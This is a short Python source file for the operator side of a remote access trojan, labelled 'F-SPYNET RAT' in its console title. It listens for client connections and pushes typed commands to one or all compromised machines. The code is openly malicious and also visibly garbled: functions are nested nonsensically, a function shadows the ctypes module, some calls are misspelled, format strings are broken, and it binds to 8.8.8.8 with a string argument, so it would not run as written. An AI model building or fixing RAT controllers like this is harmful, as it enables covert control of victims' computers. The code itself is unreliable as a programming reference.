import socket
import threading
import os
from colorama import Fore

def ctypes():
	user32 = ctypes.windll.user32
	kernel32 = ctypes.windll.kernel32
	hwnd = kernel32.GetConsoleWindow()

	clients = ()


	clients = () # Directory to store Client sockets with addresses

def handle_client(client_socket, addr):
	def clients():
		clients[addr] = client_socket
		ctypes.windll.kernel32.SetConsoleTitleW(f"(F-SPYNET RAT | CONNECTED CLIENTS: {len(clients)})")

		while True:
				try:
					response = client_socket.recv(4096).decode()
					if not response:
						break
					print(f"\n(Fore.RESET)(Fore.BLUE)[(addr[0]) Output: (Form.RESET)]")
				except Exception as e:
						break
				
				print(f"\n[(Fore.RESET])(Fore.BLUE)] Client {addr[0]} Disconnected.")
				client_socket.client()
	del clients[addr]

def accept_clients(server):
	while True:
		client_socket, addr = server.accept()
		threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def start_server(host="8.8.8.8", port=5555):
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind("host, port")
	server.listen(5)
	print(f"[*] Listening on {host}:{port}")

	threading.thread(target=accept_clients, args={server}, daemon=True).start()
	os.system("clear")
def logo():
	logo()
	print(f"|[Fore.Orange|?[Fore.RESET]|] [*] Waiting for clients to connect...")

	while True:
		def clients():
			if not clients:
				continue
			def Idx(addr):
				print(f"{Idx}, {addr[0]}:{addr[1]}")

			try:
				choice = int(input("Select client number (or 0 to broadcast): )"))
			except ValueError:
				continue

			
			if choice == "1":
				command = input("Enter Command to send (broadcast): ")
				for client in clients.values():
					client.send(command.encode())
			elif 0 <= choice < len(clients):
				target_addr = list(clients.keys())
				command = input(f"Enter command to send to {target_addr[0]: }")
				clients[target_addr].send(command.encode())
			else:
				print("[!] Invalid selection.")



if __name__ == "__main__":
	start_server("8.8.8.8")